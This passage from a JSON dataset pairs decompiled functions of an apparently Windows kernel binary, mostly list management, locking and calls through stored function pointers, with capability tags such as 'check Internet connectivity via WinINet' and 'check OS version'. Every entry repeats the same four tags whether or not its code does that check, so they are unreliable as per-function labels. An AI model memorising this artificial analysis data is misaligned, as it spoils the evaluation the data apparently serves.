        "decompiled_code": "\nint32_t __cdecl fcn.0003a3b0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    if (arg_8h == 0) {\n        iVar1 = -0x3fffff11;\n    }\n    else if (arg_ch == 0) {\n        iVar1 = 0;\n    }\n    else {\n        if (arg_10h == 0) {\n            var_4h = 0x8007a7f0;\n        }\n        else {\n            if (arg_10h != 2) {\n                return -0x3fffff0f;\n            }\n            var_4h = 0x8007a960;\n        }\n        iVar1 = fcn.00063e20(arg_ch, 0x50, 5, &var_14h);\n        if (iVar1 == 0) {\n            if (var_14h < 5) {\n                iVar1 = 0;\n            }\n            else {\n                fcn.00037640(0x800ce7b8, &var_8h, 1);\n                var_ch = fcn.0003ad70(arg_8h, 1);\n                if (var_ch != 0) {\n                    if (arg_10h == 0) {\n                        var_10h = var_ch + 8;\n                    }\n                    else if (arg_10h == 2) {\n                        var_10h = var_ch + 0xc;\n                    }\n                }\n                fcn.00037670(0x800ce7b8, &var_8h, 1);\n                iVar1 = fcn.000636c0(arg_ch, var_4h, var_10h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 478
    },
    "0003a4b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0003a541)\n// WARNING: Removing unreachable block (ram,0x0003a54e)\n// WARNING: Removing unreachable block (ram,0x0003a570)\n// WARNING: Removing unreachable block (ram,0x0003a57d)\n// WARNING: Removing unreachable block (ram,0x0003a5a1)\n// WARNING: Removing unreachable block (ram,0x0003a5ad)\n// WARNING: Removing unreachable block (ram,0x0003a5e1)\n// WARNING: Removing unreachable block (ram,0x0003a576)\n// WARNING: Removing unreachable block (ram,0x0003a568)\n// WARNING: Switch with 1 destination removed at 0x0003a4da\n\nuint __cdecl fcn.0003a4b0(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch < 5) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    return 0;\n}\n",
        "token_count": 305
    },
    "0003a630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003a630(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800ce7b8, &var_8h, 0);\n    iVar1 = fcn.0003af20(arg_10h, 1);\n    if (iVar1 == 0) {\n        fcn.00037670(0x800ce7b8, &var_8h, 0);\n        iVar1 = -0x3fffff0f;\n    }\n    else {\n        var_4h = *(iVar1 + 4);\n        fcn.00037670(0x800ce7b8, &var_8h, 0);\n        fcn.0003ade0(arg_ch, 0, var_4h);\n        uVar3 = arg_ch;\n        pcVar2 = fcn.00063f30(arg_8h);\n        iVar1 = (*pcVar2)(arg_8h, uVar3, arg_10h, arg_14h);\n        if (iVar1 != 0) {\n            fcn.0003ab00(arg_ch);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 321
    },
    "0003a6d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003a6d0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800ce7b8, &var_4h, 0);\n    iVar1 = fcn.0003ad00(arg_ch, 1);\n    if ((iVar1 == 0) || (*(iVar1 + 4) == 0)) {\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n    }\n    else {\n        arg_8h_00 = *(iVar1 + 0x14);\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n        pcVar2 = fcn.00063f30(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch);\n        fcn.0003ab00(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0003a750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003a750(uint arg_8h, uint arg_ch, char *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint var_4h;\n    \n    if ((*arg_10h == -0x74) && (*(arg_10h + 2) == 0x1c)) {\n        fcn.0003a320(arg_ch);\n    }\n    uVar3 = arg_ch;\n    pcVar4 = arg_10h;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, pcVar4);\n    if (((iVar2 == 0) && (*arg_10h == -0x74)) && (*(arg_10h + 2) == 0x1c)) {\n        fcn.0003a3b0(arg_ch, *(arg_10h + 8), 0);\n        fcn.0003a3b0(arg_ch, *(arg_10h + 0xc), 2);\n    }\n    return iVar2;\n}\n",
        "token_count": 265
    },
    "0003a7f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003a7f0(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_1ch = 0;\n    var_10h = 0;\n    fcn.00037640(0x800ce7b8, &var_8h, 0);\n    iVar2 = fcn.0003ad00(arg_ch, 1);\n    if (iVar2 != 0) {\n        var_10h = *(iVar2 + 0x14);\n        if (*(iVar2 + 8) == 0) {\n            var_20h = *(*(iVar2 + 4) + 0xc);\n        }\n        else {\n            var_20h = *(iVar2 + 8);\n        }\n        var_1ch = var_20h;\n    }\n    fcn.00037670(0x800ce7b8, &var_8h, 0);\n    if (((var_10h != 0) && (var_1ch != 0)) && (iVar2 = fcn.00048eb0(),  iVar2 != 0)) {\n        var_4h = arg_10h;\n        while( true ) {\n            if (var_4h == NULL) {\n                cVar1 = (**0x80051004)();\n                if (cVar1 == '\\x02') {\n                    arg_18h = arg_18h | 1;\n                }\n                (**0x800ce738)(var_10h, arg_10h, arg_14h, arg_18h);\n                return;\n            }\n            iVar2 = fcn.00039b50(var_4h, arg_ch);\n            if (iVar2 != 0) break;\n            var_4h[4] = *0x800ce7dc;\n            var_4h = *var_4h;\n        }\n        for (var_14h = arg_10h; var_14h != NULL; var_14h = *var_14h) {\n            fcn.00039c00(var_14h, arg_ch, var_14h + 4);\n        }\n        pcVar3 = fcn.00063f30(arg_8h);\n        (*pcVar3)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        return;\n    }\n    pcVar3 = fcn.00063f30(arg_8h);\n    (*pcVar3)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 667
    },
    "0003a960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003a960(uint arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar2 = arg_14h;\n    var_4h = NULL;\n    var_20h = 0;\n    var_10h = 0;\n    fcn.00037640(0x800ce7b8, &var_8h, 0);\n    iVar4 = fcn.0003ad00(arg_ch, 1);\n    if (iVar4 != 0) {\n        if (*(iVar4 + 0xc) == 0) {\n            var_24h = *(*(iVar4 + 4) + 0x10);\n        }\n        else {\n            var_24h = *(iVar4 + 0xc);\n        }\n        var_20h = var_24h;\n        var_10h = *(iVar4 + 0x14);\n    }\n    fcn.00037670(0x800ce7b8, &var_8h, 0);\n    if ((var_10h == 0) || (var_20h == 0)) {\n        pcVar5 = fcn.00063f30(arg_8h);\n        (*pcVar5)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        for (var_4h = arg_10h; (var_4h != NULL && (var_4h[4] != *0x800ce7dc)); var_4h = *var_4h) {\n        }\n        if (var_4h == NULL) {\n            pcVar5 = fcn.00063f30(arg_8h);\n            (*pcVar5)(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n        else {\n            cVar3 = (**0x80051004)();\n            if (cVar3 == '\\x02') {\n                arg_14h = arg_14h | 1;\n            }\n            var_4h = arg_10h;\n            puVar1 = var_4h;\n            while (var_4h = puVar1,  var_4h != NULL) {\n                puVar1 = *var_4h;\n                *var_4h = 0;\n                if (var_4h[4] == *0x800ce7dc) {\n                    iVar4 = fcn.00039c00(var_4h, arg_ch, var_4h + 4);\n                    if (iVar4 == 0) {\n                        (**0x800ce73c)(var_10h, var_4h, uVar2);\n                    }\n                }\n                else {\n                    uVar6 = arg_8h;\n                    uVar7 = arg_ch;\n                    puVar8 = var_4h;\n                    uVar9 = arg_14h;\n                    pcVar5 = fcn.00063f30(arg_8h);\n                    (*pcVar5)(uVar6, uVar7, puVar8, uVar9);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 821
    },
    "0003ab00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003ab00(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        uVar1 = 0x21590065;\n    }\n    else {\n        fcn.0003a320(arg_8h);\n        fcn.00037640(0x800ce7b8, &var_4h, 1);\n        var_8h = NULL;\n        for (var_ch = *0x800ce7c8; (var_ch != NULL && (var_ch[5] != arg_8h)); var_ch = *var_ch) {\n            var_8h = var_ch;\n        }\n        if (var_ch != NULL) {\n            if (var_8h == NULL) {\n                *0x800ce7c8 = *var_ch;\n            }\n            else {\n                *var_8h = *var_ch;\n            }\n        }\n        fcn.00037670(0x800ce7b8, &var_4h, 1);\n        if (var_ch == NULL) {\n            uVar1 = 0xc00000ef;\n        }\n        else {\n            fcn.000357f0(var_ch);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 310
    },
    "0003abd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0003abd0(int32_t arg_8h)\n\n{\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    do {\n        var_8h = 0;\n        fcn.00037640(0x800ce7b8, &var_4h, 0);\n        for (var_ch = *0x800ce7c8; var_ch != NULL; var_ch = *var_ch) {\n            if (var_ch[4] == arg_8h) {\n                var_8h = var_ch[5];\n                break;\n            }\n        }\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n        if (var_8h == 0) {\n            return 0;\n        }\n        fcn.0003ab00(var_8h);\n    } while( true );\n}\n",
        "token_count": 219
    },
    "0003ac50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003ac50(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.0003a250(arg_8h);\n    fcn.00037640(0x800ce7b8, &var_4h, 0);\n    var_ch = NULL;\n    for (var_8h = *0x800ce7c4; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n        var_ch = var_8h;\n    }\n    if (var_8h != NULL) {\n        if (var_ch == NULL) {\n            *0x800ce7c4 = *var_8h;\n        }\n        else {\n            *var_ch = *var_8h;\n        }\n    }\n    fcn.00037670(0x800ce7b8, &var_4h, 0);\n    if (var_8h == NULL) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        fcn.000357f0(var_8h);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 293
    },
    "0003ad00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003ad00(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce7b8, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce7c8; (var_8h != NULL && (var_8h[6] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 178
    },
    "0003ad70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003ad70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce7b8, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce7c8; (var_8h != NULL && (var_8h[5] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 178
    },
    "0003ade0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003ade0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *arg_8h_00;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.000356f0(0x1c);\n    if (arg_8h_00 == NULL) {\n        var_4h = -0x3fffff66;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        arg_8h_00[5] = arg_8h;\n        arg_8h_00[6] = arg_ch;\n        arg_8h_00[4] = arg_10h;\n        fcn.00037640(0x800ce7b8, &var_8h, 1);\n        iVar1 = fcn.0003aeb0(arg_10h, 1);\n        if (iVar1 == 0) {\n            var_4h = -0x3fffff0f;\n        }\n        else {\n            arg_8h_00[1] = iVar1;\n            *arg_8h_00 = *0x800ce7c8;\n            var_4h = 0;\n            *0x800ce7c8 = arg_8h_00;\n        }\n        fcn.00037670(0x800ce7b8, &var_8h, 1);\n        if (var_4h != 0) {\n            fcn.000357f0(arg_8h_00);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 470
    },
    "0003aeb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003aeb0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce7b8, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce7c4; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 179
    },
    "0003af20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003af20(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce7b8, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce7c4; (var_8h != NULL && (var_8h[2] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce7b8, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 178
    },
    "0003af90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003af90(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = fcn.000356f0(0x1c);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[1] = arg_8h;\n        puVar1[2] = *(arg_8h + 0x10);\n        fcn.00037640(0x800ce7b8, &var_4h, 1);\n        *puVar1 = *0x800ce7c4;\n        *0x800ce7c4 = puVar1;\n        fcn.00037670(0x800ce7b8, &var_4h, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 301
    },
    "0003b020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003b020(void)\n\n{\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_1ch = fcn.00034f40(0x80054990, &var_20h);\n    if ((((((var_1ch == 0) && (var_1ch = fcn.0005cd70(var_20h, 0x80054ba4, &var_4h),  var_1ch == 0)) &&\n          (var_1ch = fcn.0005cd70(var_20h, 0x80054b88, &var_18h),  var_1ch == 0)) &&\n         ((var_1ch = fcn.0005cd70(var_20h, 0x80054f80, &var_8h),  var_1ch == 0 &&\n          (var_1ch = fcn.0005cd70(var_20h, 0x80054fa4, &var_ch),  var_1ch == 0)))) &&\n        ((var_1ch = fcn.0005cd70(var_20h, 0x80054fbc, &var_10h),  var_1ch == 0 &&\n         ((var_1ch = fcn.0005cd70(var_20h, 0x80054fd0, &var_14h),  var_1ch == 0 &&\n          (var_1ch = fcn.000636c0(var_18h, 0x8007bc00, 0x800ce858),  var_1ch == 0)))))) &&\n       ((var_1ch = fcn.000636c0(var_4h, 0x8007bbe0, 0x800ce85c),  var_1ch == 0 &&\n        ((var_1ch = fcn.000636c0(var_8h, 0x8007bcd0, 0x800ce860),  var_1ch == 0 &&\n         (var_1ch = fcn.000636c0(var_ch, 0x8007bca0, 0x800ce86c),  var_1ch == 0)))))) {\n        var_1ch = fcn.000636c0(var_10h, 0x8007bc70, 0x800ce870);\n    }\n    if (var_1ch != 0) {\n        fcn.0003b1d0();\n    }\n    return var_1ch;\n}\n",
        "token_count": 659
    },
    "0003b210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003b210(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_4h = fcn.000356f0(0x18);\n    if (var_4h == NULL) {\n        var_ch = 0xc000009a;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = 0;\n        var_4h[2] = 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n        var_4h[5] = 0;\n        var_4h[3] = arg_8h + *0x800db720;\n        var_4h[4] = arg_8h + *0x800db76c;\n        var_4h[2] = arg_8h;\n        var_4h[1] = arg_ch;\n        fcn.00037640(0x800ce848, &var_8h, 1);\n        iVar1 = fcn.000533b0(0x800ce878, 0, 0);\n        if (iVar1 == 0) {\n            var_ch = 0x21590006;\n        }\n        else {\n            *var_4h = *0x800ce854;\n            *0x800ce854 = var_4h;\n            var_ch = 0;\n        }\n        fcn.00037670(0x800ce848, &var_8h, 1);\n    }\n    return var_ch;\n}\n",
        "token_count": 384
    },
    "0003b2e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003b2e0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    int32_t *var_20h;\n    uint32_t var_1ch;\n    int32_t *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = NULL;\n    iVar2 = fcn.000533b0(0x800ce878, 0, 0);\n    if (iVar2 == 0) {\n        return 0x21590006;\n    }\n    fcn.00037640(0x800ce848, &var_8h, 0);\n    var_4h = fcn.0003e2d0(arg_8h, 1, 0);\n    if (var_4h == 0) {\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        return -0x3ffffff8;\n    }\n    var_14h = *(var_4h + 0x14);\n    var_ch = *(var_4h + 4);\n    fcn.00037670(0x800ce848, &var_8h, 0);\n    if (var_14h != NULL) {\n        return -0x3fffffdf;\n    }\n    var_14h = fcn.000356f0(0x18);\n    if (var_14h == NULL) {\n        return -0x3fffff66;\n    }\n    *var_14h = 0;\n    var_14h[1] = 0;\n    var_14h[2] = 0;\n    var_14h[3] = 0;\n    var_14h[4] = 0;\n    var_14h[5] = 0;\n    var_18h = arg_8h + *0x800db738;\n    if (*var_18h != 0) {\n        cVar1 = (**0x80051214)(*var_18h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003b6f4;\n        }\n        var_10h = fcn.00063e20(*var_18h, 0x30, 5, &var_1ch);\n        if ((var_10h != 0) || ((3 < var_1ch && (var_10h = fcn.000636c0(*var_18h, 0x8007bfb0, var_14h),  var_10h != 0))))\n        goto code_r0x0003b6f4;\n    }\n    var_20h = arg_8h + *0x800db740;\n    if (*var_20h != 0) {\n        cVar1 = (**0x80051214)(*var_20h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003b6f4;\n        }\n        var_10h = fcn.00063e20(*var_20h, 0x30, 5, &var_24h);\n        if ((var_10h != 0) ||\n           ((3 < var_24h && (var_10h = fcn.000636c0(*var_20h, 0x8007bf70, var_14h + 2),  var_10h != 0))))\n        goto code_r0x0003b6f4;\n    }\n    var_28h = arg_8h + *0x800db744;\n    if (*var_28h != 0) {\n        cVar1 = (**0x80051214)(*var_28h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003b6f4;\n        }\n        var_10h = fcn.00063e20(*var_28h, 0x30, 5, &var_2ch);\n        if ((var_10h != 0) ||\n           ((3 < var_2ch && (var_10h = fcn.000636c0(*var_28h, 0x8007c010, var_14h + 3),  var_10h != 0))))\n        goto code_r0x0003b6f4;\n    }\n    var_30h = arg_8h + *0x800db750;\n    if (*var_30h != 0) {\n        cVar1 = (**0x80051214)(*var_30h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003b6f4;\n        }\n        var_10h = fcn.00063e20(*var_30h, 0x30, 5, &var_34h);\n        if ((var_10h != 0) ||\n           ((3 < var_34h && (var_10h = fcn.000636c0(*var_30h, 0x8007bf50, var_14h + 4),  var_10h != 0))))\n        goto code_r0x0003b6f4;\n    }\n    var_38h = arg_8h + *0x800db764;\n    if (*var_38h != 0) {\n        cVar1 = (**0x80051214)(*var_38h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003b6f4;\n        }\n        var_10h = fcn.00063e20(*var_38h, 0x30, 5, &var_3ch);\n        if ((var_10h != 0) ||\n           ((3 < var_3ch && (var_10h = fcn.000636c0(*var_38h, 0x8007bef0, var_14h + 5),  var_10h != 0))))\n        goto code_r0x0003b6f4;\n    }\n    var_40h = arg_8h + *0x800db75c;\n    if (*var_40h != 0) {\n        cVar1 = (**0x80051214)(*var_40h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003b6f4;\n        }\n        var_10h = fcn.00063e20(*var_40h, 0x30, 5, &var_44h);\n        if ((var_10h != 0) ||\n           ((3 < var_44h && (var_10h = fcn.000636c0(*var_40h, 0x8007bfe0, var_14h + 1),  var_10h != 0))))\n        goto code_r0x0003b6f4;\n    }\n    fcn.00037640(0x800ce848, &var_8h, 0);\n    var_4h = fcn.0003e2d0(arg_8h, 1, 0);\n    if (var_4h == 0) {\n        var_10h = -0x3ffffff8;\n    }\n    else {\n        *(var_4h + 0x14) = var_14h;\n        var_10h = 0;\n    }\n    fcn.00037670(0x800ce848, &var_8h, 0);\ncode_r0x0003b6f4:\n    if (var_10h != 0) {\n        fcn.00063b20(var_14h);\n        fcn.00063b20(var_14h + 2);\n        fcn.00063b20(var_14h + 3);\n        fcn.00063b20(var_14h + 4);\n        fcn.00063b20(var_14h + 5);\n        fcn.00063b20(var_14h + 1);\n        fcn.000357f0(var_14h);\n    }\n    return var_10h;\n}\n",
        "token_count": 1996
    },
    "0003b760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
